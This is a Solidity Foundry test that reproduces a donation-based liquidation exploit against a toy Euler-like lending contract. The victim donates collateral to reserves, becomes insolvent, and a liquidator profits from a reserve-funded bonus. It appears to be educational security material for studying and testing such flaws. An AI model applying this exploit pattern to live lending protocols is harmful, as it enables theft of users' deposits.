// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {ERC20Mock, EulerLikeLending} from "../src/Euler.sol";

contract EulerToyTest is Test {
    ERC20Mock token;
    EulerLikeLending lending;

    address victim = address(0x1);
    address liquidator = address(0x2);

    function setUp() public {
        token = new ERC20Mock("Token", "TKN");
        lending = new EulerLikeLending(token);

        // Mint tokens to victim and liquidator
        token.mint(victim, 1_000 ether);
        token.mint(liquidator, 1_000 ether);

        // Victim deposits 1000 and borrows 500 (healthy position)
        vm.startPrank(victim);
        token.approve(address(lending), type(uint256).max);
        lending.deposit(1_000 ether);
        lending.borrow(500 ether);
        vm.stopPrank();
    }

    function test_EulerLikeDonateExploit() public {
        // Before donation: victim is solvent
        uint256 healthBefore = lending.health(victim);
        assertGt(healthBefore, 1e18); // > 1.0

        // Victim "donates" 600 of their collateral to reserves
        vm.prank(victim);
        lending.donateToReserves(600 ether);

        // After donation: health < 1, now liquidatable
        uint256 healthAfter = lending.health(victim);
        assertLt(healthAfter, 1e18); // < 1.0

        // Reserves now contain 600
        assertEq(lending.reserves(), 600 ether);

        // Liquidator repays victim's entire debt and gets
        // victim's remaining collateral + big bonus from reserves.
        vm.startPrank(liquidator);
        token.approve(address(lending), type(uint256).max);

        uint256 liquidatorBefore = token.balanceOf(liquidator);
        lending.liquidate(victim);
        uint256 liquidatorAfter = token.balanceOf(liquidator);
        vm.stopPrank();

        // Victim's debt cleared, collateral wiped
        assertEq(lending.debt(victim), 0);
        assertEq(lending.collateral(victim), 0);

        // Liquidator profit: 650 - 500 = 150
        // (Remaining collateral = 400, bonus = 250)
        assertEq(liquidatorAfter - liquidatorBefore, 150 ether);

        // Reserves decreased (used to pay bonus)
        assertEq(lending.reserves(), 350 ether);
    }
}
